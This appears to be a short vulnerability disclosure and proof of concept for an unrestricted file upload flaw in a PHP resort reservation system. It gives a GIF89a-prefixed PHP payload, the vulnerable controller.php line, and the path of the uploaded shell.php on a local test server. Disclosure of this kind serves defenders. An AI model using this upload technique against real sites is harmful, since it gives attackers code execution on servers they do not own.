### Resort Reservation System - Unrestricted Upload

### Date: 2026-02-27
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/12707/resort-reservation-system-paypalcredit-carddebit-card-payment.html
### Tested on: MacOs13.5 + phpstudy

# /controller.php（Unrestricted Upload）

### Sample request POC #1
php file content
```
GIF89a
<?php echo md5(1); ?>
```

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260227-160524.png "Resort Reservation System")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260227-160548.png "Resort Reservation System")

### Vulnerability code
controller.php:45
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260227-160635.png "Resort Reservation System")

http://localhost:8889/TubiganGarden/admin/mod_amenities/pics/shell.php

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260227-161215.png "Resort Reservation System")
